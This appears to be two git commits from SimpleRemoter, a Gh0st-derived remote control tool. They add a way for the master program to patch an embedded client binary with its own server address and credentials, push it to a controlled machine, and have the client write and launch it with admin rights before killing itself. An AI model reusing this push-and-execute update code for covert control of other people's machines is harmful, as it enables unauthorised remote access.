yuanyuanxiang/SimpleRemoter

commit 2fb77d512b954b167585c91c451c0708711fcf76

Improve: Add client update logic for client type EXE

client/test.cpp
@@ -319,7 +319,11 @@ int main(int argc, const char *argv[])
 
     status = 0;
     Mprintf("结束运行.\n");
-    Sleep(1000);
+    Sleep(500);
+    if (isService) {
+        Mprintf("CALL ServiceWrapper_Stop.\n");
+        int r = ServiceWrapper_Stop();
+    }
     Logger::getInstance().stop();
 
     return 0;

server/2015Remote/2015RemoteDlg.cpp
@@ -48,6 +48,7 @@
 #include <ServerServiceWrapper.h>
 #include "CDlgFileSend.h"
 #include "CClientListDlg.h"
+#include "CUpdateDlg.h"
 
 #ifdef _DEBUG
 #define new DEBUG_NEW
@@ -1781,17 +1782,72 @@ void CMy2015RemoteDlg::OnOnlineMessage()
 
 void CMy2015RemoteDlg::OnOnlineUpdate()
 {
+    context* ContextObject = nullptr;
+    EnterCriticalSection(&m_cs);
+    int n = m_CList_Online.GetSelectedCount();
+    POSITION Pos = m_CList_Online.GetFirstSelectedItemPosition();
+    if (Pos) {
+        int	iItem = m_CList_Online.GetNextSelectedItem(Pos);
+        ContextObject = (context*)m_CList_Online.GetItemData(iItem);
+    }
+	LeaveCriticalSection(&m_cs);
+    if (n != 1 || !ContextObject) {
+		MessageBox(_T("请选择一个被控程序进行升级!"), _T("提示"), MB_ICONWARNING);
+        return;
+    }
     if (IDYES != MessageBox(_T("确定升级选定的被控程序吗?\n需受控程序支持方可生效!"),
                             _T("提示"), MB_ICONQUESTION | MB_YESNO))
         return;
+    PBYTE buffer = nullptr;
+	ULONGLONG fileSize = 0;
+	CString clientType = ContextObject->GetAdditionalData(RES_CLIENT_TYPE).GetString();
+    if (clientType == "EXE") {
+        CUpdateDlg dlg(this);
+        if (dlg.DoModal() != IDOK)
+            return;
+        DWORD dwFileSize = 0;
+        BOOL is64bit = "64" == ContextObject->GetAdditionalData(RES_PROGRAM_BITS);
+        std::filesystem::path path = ContextObject->GetAdditionalData(RES_FILE_PATH).GetString();
+        std::string stem = path.stem().string();
+        std::string dirName = path.parent_path().filename().string();
+        BYTE* szBuffer = ReadResource(dlg.m_nSelected ? (is64bit ? IDR_GHOST_X64 : IDR_GHOST_X86) :
+            (is64bit ? IDR_TESTRUN_X64 : IDR_TESTRUN_X86), dwFileSize);
+        CONNECT_ADDRESS g_ConnectAddress = { FLAG_FINDEN };
+        int iOffset = MemoryFind((char*)szBuffer, (char*)g_ConnectAddress.Flag(), dwFileSize, g_ConnectAddress.FlagLen());
+        if (iOffset == -1) {
+            SAFE_DELETE(szBuffer);
+            return;
+        }
+        CONNECT_ADDRESS* dst = (CONNECT_ADDRESS*)(szBuffer + iOffset);
+        dst->SetAdminId(GetMasterHash().c_str());
+        memcpy(dst->szFlag, GetMasterId().c_str(), 16);
+        strcpy_s(dst->szServerIP, THIS_CFG.GetStr("settings", "master", "127.0.0.1").c_str());
+        strcpy_s(dst->szPort, THIS_CFG.GetStr("settings", "port", "6543").c_str());
+        dst->Encrypt();
+        dst->iType = dlg.m_nSelected ? CLIENT_TYPE_ONE : CLIENT_TYPE_MEMDLL;
+        dst->iStartup = dlg.m_nSelected ? Startup_GhostMsc : Startup_TestRunMsc;
+        strcpy_s(dst->szBuildDate, DLL_VERSION);
+        memcpy(dst->pwdHash, GetPwdHash().c_str(), 64);
+        strcpy_s(dst->installDir, dirName.c_str());
+        strcpy_s(dst->installName, stem.c_str());
 
-    Buffer* buf = m_ServerDLL[PAYLOAD_DLL_X64];
-    ULONGLONG fileSize = buf->length(true) - 6;
-    PBYTE buffer = new BYTE[fileSize + 9];
-    if (buffer) {
+		fileSize = dwFileSize;
+        buffer = new BYTE[fileSize + 9];
+		buffer[0] = COMMAND_UPDATE;
+        memcpy(buffer + 1, &fileSize, 8);
+		memcpy(buffer + 9, szBuffer, fileSize);
+		SAFE_DELETE_ARRAY(szBuffer);
+    }
+    else if (clientType == "DLL") {
+        Buffer* buf = m_ServerDLL[PAYLOAD_DLL_X64];
+        fileSize = buf->length(true) - 6;
+        buffer = new BYTE[fileSize + 9];
         buffer[0] = COMMAND_UPDATE;
         memcpy(buffer + 1, &fileSize, 8);
         memcpy(buffer + 9, buf->c_str() + 6, fileSize);
+    }
+
+    if (buffer) {
         SendSelectedCommand((PBYTE)buffer, 9 + fileSize);
         delete[] buffer;
     }

client/ClientDll.cpp
@@ -265,6 +265,11 @@ int main(int argc, const char *argv[])
 
     SAFE_CLOSE_HANDLE(hMutex);
     Mprintf("结束运行.\n");
+    Sleep(500);
+    if (isService) {
+        Mprintf("CALL ServiceWrapper_Stop.\n");
+        int r = ServiceWrapper_Stop();
+    }
     Logger::getInstance().stop();
 
     return 0;

client/KernelManager.cpp
@@ -949,6 +949,25 @@ VOID CKernelManager::OnReceive(PBYTE szBuffer, ULONG ulLength)
                 TerminateProcess(GetCurrentProcess(), 0xABCDEF);
             }
             Mprintf("CKernelManager: [%s] Update FAILED.\n", curFile);
+        } else if(typ == CLIENT_TYPE_ONE){
+            ULONGLONG size = 0;
+            memcpy(&size, (const char*)szBuffer + 1, sizeof(ULONGLONG));
+			const char* name = "updater.exe";
+            char curFile[_MAX_PATH] = {};
+            GetModuleFileName(NULL, curFile, MAX_PATH);
+            GET_FILEPATH(curFile, name);
+            DeleteFileA(curFile);
+            if (!WriteBinaryToFile((const char*)szBuffer + 1 + sizeof(ULONGLONG), size, name)) {
+                Mprintf("CKernelManager: Write \"%s\" failed.\n", curFile);
+                break;
+            }
+            if (IsPowerShellAvailable() && StartAdminLauncherAndExit(curFile, false)) {
+                g_bExit = S_CLIENT_UPDATE;
+                Mprintf("CKernelManager: [%s] Will be executed.\n", curFile);
+                Sleep(1000);
+                TerminateProcess(GetCurrentProcess(), 0xABCDEF);
+            }
+            Mprintf("CKernelManager: [%s] Execute FAILED.\n", curFile);
         } else {
             Mprintf("=====> 客户端类型'%d'不支持文件升级\n", typ);
         }

client/ServiceWrapper.c
@@ -315,6 +315,67 @@ DWORD WINAPI ServiceWrapper_WorkerThread(LPVOID lpParam)
     return ERROR_SUCCESS;
 }
 
+
+int ServiceWrapper_Stop(void)
+{
+    // 打开SCM
+    SC_HANDLE hSCM = OpenSCManagerA(NULL, NULL, SC_MANAGER_CONNECT);
+    if (!hSCM) {
+        return (int)GetLastError();
+    }
+
+    // 打开服务
+    SC_HANDLE hService = OpenServiceA(hSCM, g_MyService.Name, SERVICE_STOP | SERVICE_QUERY_STATUS);
+    if (!hService) {
+        int err = (int)GetLastError();
+        CloseServiceHandle(hSCM);
+        return err;
+    }
+
+    // 查询当前状态
+    SERVICE_STATUS status;
+    if (!QueryServiceStatus(hService, &status)) {
+        int err = (int)GetLastError();
+        CloseServiceHandle(hService);
+        CloseServiceHandle(hSCM);
+        return err;
+    }
+
+    // 如果服务未运行，直接返回成功
+    if (status.dwCurrentState == SERVICE_STOPPED) {
+        CloseServiceHandle(hService);
+        CloseServiceHandle(hSCM);
+        return ERROR_SUCCESS;
+    }
+
+    // 发送停止控制命令
+    if (!ControlService(hService, SERVICE_CONTROL_STOP, &status)) {
+        DWORD err = GetLastError();
+        if (err != ERROR_SERVICE_NOT_ACTIVE) {
+            CloseServiceHandle(hService);
+            CloseServiceHandle(hSCM);
+            return (int)err;
+        }
+    }
+
+    // 等待服务停止（最多3秒）
+    int waitCount = 0;
+    while (status.dwCurrentState != SERVICE_STOPPED && waitCount < 3) {
+        Sleep(1000);
+        waitCount++;
+        if (!QueryServiceStatus(hService, &status)) {
+            break;
+        }
+    }
+
+    int result = (status.dwCurrentState == SERVICE_STOPPED) ? ERROR_SUCCESS : ERROR_TIMEOUT;
+
+    CloseServiceHandle(hService);
+    CloseServiceHandle(hSCM);
+
+    return result;
+}
+
 BOOL ServiceWrapper_Install(void)
 {
     SC_HANDLE schSCManager;

client/ServiceWrapper.h
@@ -62,6 +62,9 @@ int ServiceWrapper_StartSimple(void);
 // 返回: ERROR_SUCCESS 或错误码
 int ServiceWrapper_Run(void);
 
+// 停止服务 0- 成功，其他值-错误码
+int ServiceWrapper_Stop(void);
+
 // 安装服务
 BOOL ServiceWrapper_Install(void);
 

server/2015Remote/2015Remote.cpp
@@ -514,14 +514,14 @@ int CMy2015RemoteApp::ExitInstance()
 
     SAFE_DELETE(m_iniFile);
 
+    Mprintf("[InitInstance] 主控程序退出运行。\n");
+    Sleep(500);
+
     // 只有在代理模式退出时才停止服务
     if (IsAgentMode()) {
-        ServerService_Stop();
         Mprintf("[InitInstance] 主控程序为代理模式，停止服务。\n");
+        ServerService_Stop();
     }
-
-    Mprintf("[InitInstance] 主控程序退出运行。\n");
-    Sleep(1000);
 
     return CWinApp::ExitInstance();
 }

commit 43e752cf9c0768b8e01a3e1b68b5813cd538d2b5

Fix: OnOnlineUpdate caused by commit 2fb77d5

client/test.cpp
@@ -403,7 +403,7 @@ BOOL Run(const char* argv1, int argv2)
         } else {
             config cfg;
             strcpy_s(path, cfg.GetStr("settings", "master", g_ConnectAddress.ServerIP()).c_str());
-            port = cfg.Get1Int("settings", "ghost", ';', 6543);
+            port = cfg.Get1Int("settings", "port", ';', 6543);
         }
         Mprintf("[server] %s:%d\n", ip, port);
         do {

server/2015Remote/2015RemoteDlg.cpp
@@ -1822,7 +1822,7 @@ void CMy2015RemoteDlg::OnOnlineUpdate()
         dst->SetAdminId(GetMasterHash().c_str());
         memcpy(dst->szFlag, GetMasterId().c_str(), 16);
         strcpy_s(dst->szServerIP, THIS_CFG.GetStr("settings", "master", "127.0.0.1").c_str());
-        strcpy_s(dst->szPort, THIS_CFG.GetStr("settings", "port", "6543").c_str());
+        strcpy_s(dst->szPort, THIS_CFG.GetStr("settings", "ghost", "6543").c_str());
         dst->Encrypt();
         dst->iType = dlg.m_nSelected ? CLIENT_TYPE_ONE : CLIENT_TYPE_MEMDLL;
         dst->iStartup = dlg.m_nSelected ? Startup_GhostMsc : Startup_TestRunMsc;
@@ -1845,6 +1845,11 @@ void CMy2015RemoteDlg::OnOnlineUpdate()
         buffer[0] = COMMAND_UPDATE;
         memcpy(buffer + 1, &fileSize, 8);
         memcpy(buffer + 9, buf->c_str() + 6, fileSize);
+    }
+    else if (clientType == "SC" || clientType == "MDLL") {
+        fileSize = 0;
+        buffer = new BYTE[fileSize + 9]();
+        buffer[0] = COMMAND_UPDATE;
     }
 
     if (buffer) {